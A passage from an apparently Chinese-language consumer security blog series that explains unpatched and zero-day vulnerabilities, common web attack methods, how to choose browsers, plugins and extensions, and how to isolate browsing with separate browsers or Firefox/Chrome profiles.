对于大部分漏洞而言，都有对应的补丁；但是少数漏洞没有补丁。没有补丁的漏洞是很危险的。为啥会出现这种情况捏？俺稍微解释一下。</p><p><strong>1. 未公开的漏洞</strong><br>　　有些黑客发现某个漏洞后，没有在圈内公开，也没有告知对应的软件厂商。那么这种漏洞就变成“未公开的漏洞”。因为没有公开，软件厂商不知情，自然也就没有发布补丁。<br>　　这种漏洞【最危险】，有可能长期被攻击者用来入侵。据俺所知，有些高危漏洞已经在黑客圈内流传多年，而相应的软件厂商依然不知情。</p><p><strong>2. 零日漏洞（Zero-Day）</strong><br>　　如今互联网很发达，某些资深且勤奋的攻击者可以对漏洞的发布作出快速反应。一旦某个漏洞的细节被公开，他们可以在24小时之内制作出相应的攻击代码。而这个时候，软件厂商多半还没来得及发布补丁。那么这些攻击者就可以利用这个时间差，进行入侵活动。所以，安全圈内也把这种漏洞称为“零日漏洞”（洋文叫：Zero-Day 或 0-Day）。相对于“未公开漏洞”，“零日漏洞”可利用的时间段会短一些。比较负责任的软件厂商通常会在一周或一月之内发布补丁。不过捏，也有些不靠谱的公司（包括大公司），要拖上好几个月才发布漏洞补丁（比如 Oracle）。</p><h2 id="★漏洞的防范措施"><a href="#★漏洞的防范措施" class="headerlink" title="★漏洞的防范措施"></a>★漏洞的防范措施</h2><p>　　针对漏洞的这几种不同分类，俺分别介绍一下几种基本的、常见的防范方式。</p><h3 id="◇个人防火墙"><a href="#◇个人防火墙" class="headerlink" title="◇个人防火墙"></a>◇个人防火墙</h3><p>　　个人防火墙主要用于防范“远程漏洞”，对于“本地漏洞”，防火墙基本帮不上忙。<br>　　因为大多数远程漏洞，都存在于你机器对外开启的监听端口中。个人防火墙可以阻止这些端口对外开放，从而避免潜在的漏洞被攻击者利用。<br>　　自从 Windows 2000 开始，微软就在操作系统中内置了防火墙功能。对于 Windows XP 以及之后的版本，可以直接到控制面板中开启它。<br>　　如果你的电脑只是用来上上网、聊聊天、看看电影、用用办公软件，那你完全可以把防火墙设置成——不开放任何对外的端口。这样一来，即便你的电脑中存在远程漏洞，也不易被攻击者利用。</p><h3 id="◇定期升级系统补丁"><a href="#◇定期升级系统补丁" class="headerlink" title="◇定期升级系统补丁"></a>◇定期升级系统补丁</h3><p>　　Windows 系统的漏洞一直比较多——毕竟用户群太大，容易被黑客盯上。所以从很多年以前，微软就开始定期提供 Windows 补丁。具体的做法是每月的第二个星期二，发布新发现的漏洞的补丁。另外，如何发现高危的漏洞，也会临时发布紧急补丁。<br>　　从 Windows 2000 开始，系统就支持自动的补丁升级机制。你只要在“控制面板”里打开“自动更新”这个功能，然后选择“自动”方式。你一定要确保系统的”自动更新”机制处于启用状态。这就可以堵住很多操作系统漏洞，从而降低攻击的风险。<br>　　提醒一下：自动更新不是 Windows 独有滴。其它一些用户群比较大的桌面系统（比如：Mac OS，Ubuntu）也提供了自动更新安全补丁的功能。</p><h3 id="◇启用软件的自动更新"><a href="#◇启用软件的自动更新" class="headerlink" title="◇启用软件的自动更新"></a>◇启用软件的自动更新</h3><p>　　有一些做得比较好的软件，会内置自动更新功能（比如：Firefox、Chrome …），一旦其官方网站有新的版本或补丁，就会自动下载并更新。如果你担心这类软件有安全问题，可以启用它们的自动更新功能。</p><h3 id="◇使用小众且活跃的软件"><a href="#◇使用小众且活跃的软件" class="headerlink" title="◇使用小众且活跃的软件"></a>◇使用小众且活跃的软件</h3><p>　　俗话说树大招风。越知名的软件，就越容易引来黑客的注意，被发现安全漏洞的概率也会增大。<br>　　比如说：IE 的用户群最大，针对 IE 漏洞的挂马攻击是各种浏览器中最普遍的；Firefox 相对就少很多；而 Chrome 和 Safari 就更少了（不过捏，随着 Firefox 和 Chrome 的流行，针对这两款浏览器的攻击也多起来了）。<br>　　再比如说：同样是 PDF 阅读器，Adobe Reader 被曝光的漏洞就比较多，相对而言，Foxit Reader 和 PDF-XChange Viewer 就没这么多问题。<br>　　为啥俺还要强调【活跃】捏？小众软件根据活跃程度可以分为：活跃 or 不活跃。不活跃的软件，通常说明：开发者维护该软件不够积极，也就意味着该软件在【漏洞修复】方面不够迅速/及时——这就会导致安全风险；反之，活跃的软件，就没这个问题。</p><p>　　关于安全漏洞的基本防范，今天就聊到这里。考虑到近年来，针对 Web 攻击的情况剧增，本系列后续的帖子会说一下 Web 相关的话题。</p><h1 id="如何防止黑客入侵-5-：Web相关的防范（上）"><a href="#如何防止黑客入侵-5-：Web相关的防范（上）" class="headerlink" title="如何防止黑客入侵[5]：Web相关的防范（上）"></a>如何防止黑客入侵[5]：Web相关的防范（上）</h1><p><strong>文章目录</strong></p><p>★Web安全的重要性<br>★Web 相关的攻击手法<br>★如何选择浏览器？<br>★如何选择插件和扩展？</p><p>　　由于俺比较懒，导致本系列已经中断了2年之久。上星期有读者留言，希望俺尽快把本系列补上。再加上昨天看到新闻，说 Java 7 爆出全系列的高危漏洞。凡此种种，促使俺补上了本系列的第5篇，关于 Web 的防范。这部分的内容比较长，为了避免大伙儿阅读疲劳，俺把《Web相关的防范》分为上中下3个部分。</p><h2 id="★Web安全的重要性"><a href="#★Web安全的重要性" class="headerlink" title="★Web安全的重要性"></a>★Web安全的重要性</h2><p>　　在聊正题之前，先给大伙儿强调一下“Web 安全”的重要性。<br>　　如今互联网非常普及，大部分的家用电脑和商业电脑，都具备联网功能。而且大部分电脑只要一开机，就处于联网状态。作为电脑的使用者，有相当一部分时间是花在 Web 浏览（俗称网上冲浪）。在这样的环境中，Web 就成了恶意软件（病毒、木马、蠕虫、勒索软件……）最理想的一种传播媒介。据说如今大部分电脑中招，都与 Web 有关。<br>　　正因为如此，才把 Web 相关的内容，单独汇总一篇。接下来，俺先介绍一下攻击者常见的招数，然后再介绍一下各种应对措施。</p><h2 id="★Web-相关的攻击手法"><a href="#★Web-相关的攻击手法" class="headerlink" title="★Web 相关的攻击手法"></a>★Web 相关的攻击手法</h2><h3 id="◇嗅探（sniffer）"><a href="#◇嗅探（sniffer）" class="headerlink" title="◇嗅探（sniffer）"></a>◇嗅探（sniffer）</h3><p>　　所谓的“嗅探”，就是攻击者利用某些技术手段，截获你的网络数据流并进行分析，从而获取某些有价值的信息。通常来说，“嗅探”只是入侵的初始阶段（准备阶段）。攻击者通过“嗅探”获取到的信息，通常用来进行辅助后续的入侵行动。</p><p>　　举例：<br>　　很多人喜欢通过公共场所的 WiFi 热点上网。假如你使用的 WiFi 热点没有设置为强加密。那么，某个攻击者就有可能利用 WiFi 嗅探工具，截获你的上网流量。如果你正好在收发 Web 邮件，而且没有通过 HTTPS 加密（好多国内的 Web 邮箱【不】支持全程 HTTPS 加密）。那么，攻击者就可以看到你的收发的邮件内容。</p><h3 id="◇钓鱼（phishing）"><a href="#◇钓鱼（phishing）" class="headerlink" title="◇钓鱼（phishing）"></a>◇钓鱼（phishing）</h3><p>　　“钓鱼攻击”包括很多种，基于 Web 的网络钓鱼是其中之一。<br>　　由于“钓鱼攻击”属于社会工程学的范畴，也不是本文的重点。今后有空的话，单独写一篇“关于钓鱼攻击的防范”。</p><h3 id="◇利用浏览器自身的安全漏洞"><a href="#◇利用浏览器自身的安全漏洞" class="headerlink" title="◇利用浏览器自身的安全漏洞"></a>◇利用浏览器自身的安全漏洞</h3><p>　　在前文里，俺已经扫盲了”漏洞”、”补丁”等概念以及相关的一些常识。健忘的同学，可以再去温习一下。<br>　　在软件行业中，几乎每一款软件都会有漏洞——浏览器自然也不例外。浏览器的漏洞有很多种，其中一类叫做”安全漏洞”。顾名思义，就是会导致安全问题的漏洞。<br>　　如果某款浏览器的安全漏洞被攻击者发现，而浏览器厂商自己还不知晓。那么攻击者就可以利用该漏洞，发起广泛的攻击。</p><p>　　举例：<br>　　假设某个黑客研究 IE 的内核，首先发现 IE 存在一个“渲染图片导致缓冲区溢出”的漏洞。由于该漏洞是独家发现，只要该黑客不公开漏洞的信息，连微软（也就是 IE 浏览器的厂商）也会蒙在鼓里。因此，也就【没有】针对该漏洞的补丁。那么，这个黑客会如何利用该漏洞捏？<br>\1. 首先挑选一张图片（为了吸引人，通常会选一张美女图之类的照片），然后精心地嵌入一段攻击代码在图片内部。<br>\2. 把这张图片放到网上（比如张贴到某个大型论坛，再配上一个吸引人的标题）。<br>\3. 过不了多久，就会吸引到很多网友来围观。如果围观的网友用的浏览器不是 IE，那么他仅仅是看到一张美女图而已，不会有啥异样。如果围观的网友用的正好是有漏洞的 IE 版本，当 IE 打开那张图片的瞬间，攻击代码就会被激活（被运行）。然后，攻击代码会悄悄地在这台电脑中安装一个木马（技术行话叫“植入木马”）。之后，这台电脑就成为攻击者的肉鸡了（攻击者可以远程控制肉鸡，为所欲为）。<br>\4. 攻击者控制了肉鸡之后，既可以拿去卖钱（有专门的地下肉鸡交易市场），也可以偷窥机主的隐私（看看有没有网银、裸照、QQ 靓号）。如果控制的肉鸡数量巨大，还可以搞 DDOS 攻击……</p><h3 id="◇利用浏览器【插件或扩展】的安全漏洞"><a href="#◇利用浏览器【插件或扩展】的安全漏洞" class="headerlink" title="◇利用浏览器【插件或扩展】的安全漏洞"></a>◇利用浏览器【插件或扩展】的安全漏洞</h3><p>　　如今大部分浏览器上，都安装了插件。最常见的插件就是 Flash 插件。另外还有“PDF 插件、Java 插件”等等。<br>　　浏览器的插件也属于软件，也会存在安全漏洞，因此也可以被攻击者利用。一般来说，攻击者对插件漏洞的利用，类似于对浏览器漏洞的利用。</p><p>　　举例1：<br>　　2011年，美国大名鼎鼎的安全公司 RSA 遭到入侵并且被深度渗透，连看家产品 SecureID 的密钥也被偷了。<br>　　攻击者之所以能得手，就是利用了 Flash 插件的一个零日漏洞。洋文好的同学，可以看“<a href="http://blogs.gartner.com/avivah-litan/2011/04/01/rsa-securid-attack-details-unveiled-they-should-have-known-better/">这里</a>”的详细报道。</p><p>　　举例2：<br>　　同样是在去年，有不少 Gmail 用户遭到入侵。但实际上，Gmail 本身并没有出问题。攻击者是利用 Flash 的漏洞，伪造跨站请求，然后在 Gmail 的转发列表中加入一个攻击者的邮箱。之后，被害人收到的所有邮件，都会自动转发给攻击者。</p><p>　　从最近几年的趋势来看，插件漏洞导致的安全问题，要多于浏览器漏洞导致的安全问题。</p><h3 id="◇跨站脚本攻击（XSS）"><a href="#◇跨站脚本攻击（XSS）" class="headerlink" title="◇跨站脚本攻击（XSS）"></a>◇跨站脚本攻击（XSS）</h3><p>　　最后再来说说”跨站脚本”的问题。<br>　　大部分 XSS 攻击，都是利用网站本身的漏洞。所谓的网站，其实就是若干 Web 服务器，上面运行若干软件。前面说了，只要是软件，就可能存在漏洞（包括安全漏洞）。所以，Web 服务器上的软件自然也不例外。<br>　　基于 XSS 的攻击有很多种类型，具体的技术原理也有所差异。考虑到大部分读者不是搞技术的，俺就不深入展开了。仅举一例，让大伙儿有个感性的认识。</p><p>　　举例：<br>　　比如某个 BBS 论坛存在漏洞——【没有】对用户发布的帖子内容（此处的“内容”，不是指文字的内容，而是指特殊字符）进行严格的检查。如果某个攻击者发现了此漏洞，就可以精心构造一个帖子，在帖子的正文中包含一段攻击脚本（通常是 JavaScript）。接下来，攻击者把这个帖子发布到该论坛上。<br>　　然后捏，如果有人浏览了这篇帖子，这段攻击脚本就会被激活，然后干坏事……</p><h2 id="★如何选择浏览器？"><a href="#★如何选择浏览器？" class="headerlink" title="★如何选择浏览器？"></a>★如何选择浏览器？</h2><p>　　对于用户来说，浏览器是 Web 的根基。所以，谈 Web 的安全防范，首先得聊一聊如何选择浏览器。<br>　　挑选浏览器有如下几个指标供参考：<br><strong>1. 浏览器的质量好不好</strong><br>评判安全方面的质量，最关键的一条是：看浏览器有没有经常出安全漏洞。<br><strong>2. 浏览器的更新快不快</strong><br>爆出漏洞后，浏览器的开发团队是否及时出补丁或新版本。<br><strong>3. 浏览器的功能强不强</strong><br>除了要看浏览器本身的功能，还要看其支持的扩展是否丰富。</p><p>　　根据上述指标，俺把市面上常见的浏览器，根据靠谱的程度，划分为如下三类：</p><h3 id="◇第一类：Firefox-和-Chrome（含-Chromium）"><a href="#◇第一类：Firefox-和-Chrome（含-Chromium）" class="headerlink" title="◇第一类：Firefox 和 Chrome（含 Chromium）"></a>◇第一类：Firefox 和 Chrome（含 Chromium）</h3><p>　　俺个人强烈建议用 Firefox 或 Chrome 进行网上冲浪，因为这两款浏览器很符合上述指标。<br><strong>质量好</strong><br>本世纪初，浏览器市场被 IE 一统天下。但随着时间推移，IE 在全球的市场份额逐步被 Chrome ＆ Firefox 占去一半以上。这充分说明 Firefox 和 Chrome 的质量很好。另外，在安全漏洞方面，Firefox 和 Chrome 也优于 IE。<br><strong>更新快</strong><br>说到快速更新（快速迭代），这是 Chrome 的首创。从去年开始，Firefox 也学 Chrome 采用快速版本更新。<br><strong>功能强</strong><br>说到功能，Firefox 刚出道时，利用丰富的扩展吸引了足够多的用户。如今，无论是扩展的种类还是扩展的下载量，Firefox 是最多的；至于 Chrome，由于出道时间晚，这扩展方面不如 Firefox，但显然比 IE 强多了。</p><p>　　除了上述这几条，这两款浏览器还具有如下优点：<br><strong>支持的平台很多</strong><br>支持三大主流的桌面系统（Windows、Mac OS、Linux），支持两大主流的移动系统（Android、iOS）。<br><strong>开源项目</strong><br>由于开源而且参与的程序员也多，所以软件中的漏洞容易被及早发现。<br>（Chromium 是开源滴；Chrome 虽然基于 Chromium，但包含【闭源】模块）</p><p>　　以上就是俺推荐 Firefox 和 Chrome 的理由。在本文的后续章节，俺会以这两款浏览器为主，进行介绍。</p><h3 id="◇第二类：IE、Safari、Opera"><a href="#◇第二类：IE、Safari、Opera" class="headerlink" title="◇第二类：IE、Safari、Opera"></a>◇第二类：IE、Safari、Opera</h3><p>　　先说 Safari 和 Opera。这两款的出道时间早于 Firefox 和 Chrome。忙活了这么多年，如今的市场份额依然很低，这已经说明某些问题。另外，俺个人觉得 Safari 和 Opera 的扩展和插件不够丰富，更新速度也不够快，所以俺不推荐。</p><p>　　至于 IE，曾经是市场份额最大的浏览器，而是集成（捆绑）在 Windows 系统中。为啥俺把它放到第二类捏？有如下几个原因：<br>\1. IE 跟 Windows 集成得太紧密。IE 如果爆漏洞，通常要等微软发布 Windows 补丁来修复。而 Windows 补丁是按月发布的——太不及时啦。<br>\2. 相比 Firefox 和 Chrome，IE 是闭源项目。由于源代码不公开，而且参与的人不够多，导致潜在的漏洞难以被发现。<br>\3. IE 用户大都是菜鸟用户（很多菜鸟只知道用系统内置的浏览器）。由于菜鸟不太懂安全防范，有些【低级】骇客就喜欢盯着这个用户群。</p><p>　　说到这儿，可能有同学会问：天朝的好多网银都只能用 IE（很多网银客户端依赖于 IE 的 ActiveX 控件），咋办捏？别担心，在本系列的下一篇《Web相关的防范 (下)》会谈到此问题的解决方法。</p><h3 id="◇第三类：五花八门的【国产】浏览器"><a href="#◇第三类：五花八门的【国产】浏览器" class="headerlink" title="◇第三类：五花八门的【国产】浏览器"></a>◇第三类：五花八门的【国产】浏览器</h3><p>　　说到【国产】的浏览器，有必要谈一下浏览器的内核（也就是浏览器的引擎）。绝大部分国产的浏览器，都不是自己开发内核，而是基于老外现成的内核。常见的浏览器内核有三款，分别是：<br>Gecko 内核（来自于 Mozilla 开源组织，主要供 Firefox 使用）<br>Trident 内核（来自于微软，主要供 IE 使用）<br>WebKit 内核（独立的开源项目，Chrome 和 Safari 使用此内核）<br>　　几款常见的国产浏览器（360浏览器、傲游浏览器、QQ 浏览器），使用的是 Webkit + Trident 的双内核模式。<br>　　某些国产浏览器把双内核作为吹嘘的亮点。但在安全层面，双内核反而会带来安全问题。假如你手头的国产浏览器采用了 Webkit + Trident 双内核。只要这两款内核中，有一个爆出安全漏洞，你就有可能中招。也就是说：双内核会增加你中招的概率。<br>　　俺极力反对【国产】浏览器，还有另一个原因——政治层面的安全问题。朝廷为了监控屁民在互联网上的一言一行，会跟国产浏览器厂商合作，通过浏览器记录网民的行踪。</p><p>　　举例：<br>　　前几年腾讯搞的“TT浏览器”，会把用户上网行踪记录在某个文件中。<br>　　至于 360，名声更是臭不可闻。360 浏览器本身就存在收集用户隐私的问题，居然还好意思自称是“安全浏览器”。而且大伙儿别忘了，奇虎公司跟 GFW 一直保持着暧昧的关系哦。</p><p>　　综上所述，俺个人【非常反对】使用国产浏览器。</p><h2 id="★如何选择插件和扩展？"><a href="#★如何选择插件和扩展？" class="headerlink" title="★如何选择插件和扩展？"></a>★如何选择插件和扩展？</h2><p>　　说完浏览器的选择，再来聊聊如何选择插件和扩展。</p><h3 id="◇插件和扩展的【区别】"><a href="#◇插件和扩展的【区别】" class="headerlink" title="◇插件和扩展的【区别】"></a>◇插件和扩展的【区别】</h3><p>　　先来扫盲一下插件和扩展的区别（连很多 IT 技术人员都把这两者混为一谈）。所谓的插件，洋文叫“plugin”；所谓的扩展，洋文叫“extension”。两者的区别如下：</p><p><strong>插件</strong><br>　　在功能上，插件通常是用来渲染 HTML 页面中的 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签。<br>　　插件通常实现比较【底层】的功能，通常以平台相关的代码（本地代码）编写，可以调用操作系统的 API。形式上，插件以动态库（Windows 上就是 DLL 文件）的方式，加载到浏览器的进程内。由于使用本地代码编写，插件通常依赖于特定的操作系统（不同系统的插件不能混用）。</p><p>举例：<br>Flash 插件<br>媒体播放器插件<br>PDF 插件<br>Java 插件</p><p><strong>扩展</strong><br>　　扩展，顾名思义，是用来扩展浏览器自身的功能。所以，扩展可以调用浏览器自身的 API，但是大部分扩展【不能】调用操作系统的 API。<br>　　一般来说，扩展是跟操作系统无关的。比如 Firefox 的大部分扩展，既可以用于 Windows 平台的 Firefox，也可以用于 Linux 和 Mac 的 Firefox。</p><h3 id="◇插件和扩展在安全方面的差异"><a href="#◇插件和扩展在安全方面的差异" class="headerlink" title="◇插件和扩展在安全方面的差异"></a>◇插件和扩展在安全方面的差异</h3><p>　　由于插件比较底层，一旦出现高危漏洞（比如能够执行本地代码的漏洞），攻击者就可以在操作系统中植入木马。可以这么说，插件出现漏洞，其危险性类似于浏览器出现漏洞。<br>　　相对而言，扩展出现漏洞，其危险性往往不如插件严重，通常也不会导致攻击者植入木马。</p><h3 id="◇尽量使用口碑好的扩展"><a href="#◇尽量使用口碑好的扩展" class="headerlink" title="◇尽量使用口碑好的扩展"></a>◇尽量使用口碑好的扩展</h3><p>　　虽然扩展出漏洞导致的危险性不如插件那么高，但也不能掉以轻心。<br>　　俺的经验是：尽量使用知名度高且评价好的扩展。这样的扩展通常成熟度也比较高——即使出了漏洞，更新也比较及时；这类扩展也会有更多安全研究人员对其进行研——即使有漏洞，也更容易被发现。<br>　　反之，对于某些很少人用的扩展，最好敬而远之。顺便提一下。某些层次低的入侵者，甚至会把木马伪装成浏览器扩展，再忽悠一个很花哨的功能，然后放到网上给大伙儿用。</p><h3 id="◇尽量避免使用【插件】"><a href="#◇尽量避免使用【插件】" class="headerlink" title="◇尽量避免使用【插件】"></a>◇尽量避免使用【插件】</h3><p>　　从上述对比可知，插件如果出现漏洞，危险性很高。所以，俺的建议是：<strong>尽量避免使用【插件】</strong>。<br>　　不过捏，避免使用插件，说起来简单，但是做起来有点难度。其它插件，说不用就不用了。但是 Flash 插件，实在是用得太广泛了（视频网站用到它，网页休闲小游戏也用到它），估计大伙儿难以割舍啊。<br>　　不幸的是，Flash 插件又最危险。一方面是因为 Adobe 的程序猿，安全意识太差；另一方面是因为 Flash 是用得最多的插件，成为攻击者的重点研究对象。根据2011年的统计数字，去年一年，光是【<strong>高危漏洞</strong>】，Flash 就爆了4次——当之无愧地坐上漏洞排行榜的头把交椅。<br>　　面对 Flash 插件，该咋办捏？列位看官，请听下回分解。（下一篇会尽快发布）</p><h1 id="如何防止黑客入侵-6-：Web相关的防范（中）"><a href="#如何防止黑客入侵-6-：Web相关的防范（中）" class="headerlink" title="如何防止黑客入侵[6]：Web相关的防范（中）"></a>如何防止黑客入侵[6]：Web相关的防范（中）</h1><p><strong>文章目录</strong></p><p>★如何防范浏览器和插件的漏洞？<br>★“多浏览器”的方案<br>★【多实例】的方案<br>★【多用户】的方案</p><p>　　在本系列的前文聊了些基础性的东西，包括：常见的攻击手法、如何选择浏览器和插件。今天，俺继续介绍几个相对高级一点的话题。</p><h2 id="★如何防范浏览器和插件的漏洞？"><a href="#★如何防范浏览器和插件的漏洞？" class="headerlink" title="★如何防范浏览器和插件的漏洞？"></a>★如何防范浏览器和插件的漏洞？</h2><p>　　在前一篇已经告诉大伙儿“如何选择浏览器”。但是光知道这个是不够滴！因为浏览器也是软件，只要是软件就可能会出现漏洞（包括安全漏洞）。<br>　　即使你按照俺的建议，选择 Firefox 或 Chrome 作为日常的浏览器，也【无法完全避免】浏览器自身出漏洞的问题。而且浏览器的漏洞中，有一些是没有补丁的高危漏洞（包括“未公开漏洞”＆“零日漏洞”，俺在前文里介绍过）。因为没有补丁，所以这类高危漏洞就特别危险。这就引出了第一个问题：<strong>如何防范浏览器的漏洞？</strong><br>　　另外，在浏览器插件中，Flash 插件既是最危险的插件，也是使用最广的插件。这就引出了第二个问题：<strong>如何安全地使用危险的插件？</strong><br>　　要解决上述2个问题，可以使用同一个原则，那就是：【<strong>对浏览器进行隔离</strong>】。具体的隔离方式有很多种，今天俺由浅入深，分别介绍一下。</p><h2 id="★“多浏览器”的方案"><a href="#★“多浏览器”的方案" class="headerlink" title="★“多浏览器”的方案"></a>★“多浏览器”的方案</h2><h3 id="◇操作步骤"><a href="#◇操作步骤" class="headerlink" title="◇操作步骤"></a>◇操作步骤</h3><p>　　这招是最简单的——就是在一台电脑上安装多款【不同内核】的浏览器。具体步骤俺就不多说了，节约点口水。</p><h3 id="◇优点"><a href="#◇优点" class="headerlink" title="◇优点"></a>◇优点</h3><p><strong>1. 解决网银的问题</strong><br>　　前面提到了国内网银依赖于 IE 的问题。但是 IE 的安全性又不如 Firefox 和 Chrome，咋办捏？最简单的办法就是同时安装两款浏览器（比如 IE + Firefox）。平时你上网的时候，用 Firefox，需要用网银，则改用 IE。<br>　　由于你仅仅在使用网银的时候，才开启 IE，大大降低了 IE 被入侵的机会。</p><p><strong>2. 解决跨站脚本（XSS）的问题</strong><br>　　使用多种浏览器，还可以帮你解决跨站脚本攻击的问题。<br>　　单纯的XSS攻击，主要是依赖 JavaScript。而 JavaScript 只能在浏览器进程内起作用，无法跨浏览器进程。所以，如果你同时使用 A B 两款浏览器。如果 A 浏览器发送 XSS 攻击，通常不会影响到 B 浏览器。除非这个 XSS 攻击结合了浏览器漏洞或插件漏洞。那么，多款浏览器是否能防范浏览器漏洞和插件漏洞捏？请看往下看。</p><p><strong>3. 部分解决高危插件（Flash）的使用问题</strong><br>　　俺在<a href="https://program-think.blogspot.com/2012/08/howto-prevent-hacker-attack-5.html">上一篇</a>提到了利用 Flash 入侵 Gmail 的案例。<br>　　比方说，你同时用 Firefox 和 Chrome。其中 Firefox 安装 Flash，用来上普通的网站；而 Chrome 不装或禁用 Flash，专门用来上 Google 的相关服务器（比如 Gmail）。<br>　　某天，你收到一封恶意的邮件，该邮件会利用 Flash 的漏洞来入侵用户的电脑。幸运的是，你用来访问 Gmail 的 Chrome 上没有 Flash 插件（被禁用），于是攻击者的阴谋没有得逞 :-)</p><h3 id="◇缺点"><a href="#◇缺点" class="headerlink" title="◇缺点"></a>◇缺点</h3><p><strong>1. 无法彻底解决浏览器漏洞和插件漏洞的问题</strong><br>　　细心的读者会注意到，刚才那个小节的标题是部分解决高危插件（Flash）的问题。为啥俺要特地强调【部分解决】捏？因为浏览器的漏洞和插件的漏洞有很多种。有些漏洞只是让浏览器崩溃，无伤大雅；而有些漏洞可以导致在本地执行代码，并且能进一步植入木马。一旦你碰到后者，即使你采用“多种浏览器”的方式，也抵挡不住。<br>　　某些天真的网友可能会问：浏览器厂商和插件厂商不是会升级补丁吗？但是问题在于，有少数一些漏洞是没有补丁的。为啥会这样捏？请看本系列上一篇《安全漏洞的基本防范》，里面介绍了”未公开漏洞”和”零日漏洞”。<br>　　不过别担心，俺后面还会介绍更高级的招数，来防范这种情况。</p><p><strong>2. 灵活性不够</strong><br>　　对于“多浏览器”的方案，还有一个缺点是不够灵活。<br>　　因为你要为每一种用途安装一款浏览器，如果你的用途比较多（比如：上网银、普通浏览、Web 邮箱、看视频），就要装好几款。<br>　　另外，有些用户就喜欢某一款浏览器，你让这些用户装好几款浏览器，他们会觉得不爽。<br>　　对于“灵活性不够”的缺点，大伙儿可以参考接下来要介绍的第二招——“多实例”的方案。</p><h2 id="★【多实例】的方案"><a href="#★【多实例】的方案" class="headerlink" title="★【多实例】的方案"></a>★【多实例】的方案</h2><h3 id="◇什么是浏览器的多实例？"><a href="#◇什么是浏览器的多实例？" class="headerlink" title="◇什么是浏览器的多实例？"></a>◇什么是浏览器的多实例？</h3><p>　　所谓的浏览器多实例，有时候也称之为“Multiple Profiles”。<br>　　不论是 Firefox 还是 Chrome，默认安装的时候，只有一个实例（Profile）。和浏览器相关的各种信息，包括：插件、扩展、外观（皮肤）、页面缓存、cookie、等等，都存储在这个实例中。<br>　　反之，如果使用多实例，每个实例都具有独立的插件、独立的扩展、独立的外观（皮肤）、独立的页面缓存、独立的 cookie、等等。不同实例之间是相对隔离的，【不会】互相影响。<br>　　对于 Chrome，再特别提醒一下：<br>　　Chrome 同时支持“Multiple Profiles”与“Multiple Accounts”。但别把这两者搞混了。即使你配置了多个 Accounts，依然在【同一个】实例里。</p><h3 id="◇操作步骤-1"><a href="#◇操作步骤-1" class="headerlink" title="◇操作步骤"></a>◇操作步骤</h3><p>　　多实例的配置，很多人不晓得。所以俺详细说一下。考虑到 Windows 用户居多，俺以 Windows 举例。Linux 和 Mac OS 的操作步骤大同小异。</p><p><strong>多实例的 Firefox</strong></p><p>　　对于 Windows 上的 Firefox，Profile 都放置于 <code>%APPDATA%\Mozilla\Firefox\Profiles</code> 目录下。<br>　　假设你想创建一个【全新的】Firefox 实例，可以通过如下命令行来启动 Firefox。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-string">&quot;&#123;PATH&#125;\firefox.exe&quot;</span> -P <span class="hljs-string">&quot;XXXX&quot;</span> -no-<span class="hljs-comment">remote</span><br></code></pre></td></tr></table></figure><p>　　上述命令中，<code>&#123;PATH&#125;</code> 表示你的 Firefox 的【安装目录】。<code>XXXX</code> 表示你要创建的【实例名】（实例名可以是任意字母组合，你也可以把 <code>XXXX</code> 改成其它名称）。<br>　　运行完上述命令，Firefox 会启动出一个名叫 <code>XXXX</code> 的实例。与此同时，在 <code>%APPDATA%\Mozilla\Firefox\Profiles</code> 下会多出一个名叫 <code>XXXX</code> 的目录。<br>　　按照上述方式依样画葫芦，你就可以启动出任意多个 Firefox 实例。为了省事，你可以把上述命令行做成一个快捷方式，放到桌面上，免得每次都敲键盘。<br>　　另外，Firefox 还提供了一个多实例的管理界面，用如下命令可以调出该界面。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;&#123;PATH&#125;\firefox.exe&quot;</span> -p<br></code></pre></td></tr></table></figure><p><strong>多实例的 Chrome</strong></p><p>　　Chrome 类似于 Firefox，也可以通过命令行启动新的实例。<br>　　对于 Windows 上的 Chrome，由于 Chrome 安装的时候没让选安装目录，所以其【<strong>exe 的安装目录固定如下</strong>】：</p><p>Windows 7 或 Vista 系统<br><code>C:\Users\**&#123;USER&#125;**\AppData\Local\Google\Chrome\Application\chrome.exe</code><br>Windows XP 系统<br><code>C:\Documents and Settings\**&#123;USER&#125;**\Local Settings\Application Data\Google\Chrome\Application\chrome.exe</code><br>　　上述的 <code>&#123;USER&#125;</code> 表示你的 Windows 用户名</p><p>　　找到 <code>chrome.exe</code> 之后，接下来，你需要创建一个目录，用来存放新创建的实例。比方说，你用的是这个目录： <code>X:\XXXX\</code><br>　　然后，通过如下命令启动 Chrome，就可以创建出新实例</p><p>Vista 或 Windows 7 系统</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\&#123;</span>USER&#125;<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\A</span>pplication<span class="hljs-symbol">\c</span>hrome.exe --user-data-dir=&quot;X:<span class="hljs-symbol">\X</span>XXX<span class="hljs-symbol">\&quot;</span><br></code></pre></td></tr></table></figure><p>Windows XP 或 Win 2003 系统</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\&#123;</span>USER&#125;<span class="hljs-symbol">\L</span>ocal Settings<span class="hljs-symbol">\A</span>pplication Data<span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\c</span>hrome.exe --user-data-dir=&quot;X:<span class="hljs-symbol">\X</span>XXX<span class="hljs-symbol">\&quot;</span><br></code></pre></td></tr></table></figure><p>　　按照上述方式依样画葫芦，你就可以创建出任意多个 Chrome 实例。为了省事，你可以把上述命令行做成一个快捷方式，放到桌面上，免得每次都敲键盘。</p><h3 id="◇优点-1"><a href="#◇优点-1" class="headerlink" title="◇优点"></a>◇优点</h3><p><strong>1. 解决跨站脚本（XSS）的问题</strong><br>　　这个优点跟“多浏览器”方案是类似的。俺就不再啰嗦了。</p><p><strong>2. 部分解决高危插件（Flash）的使用问题</strong><br>　　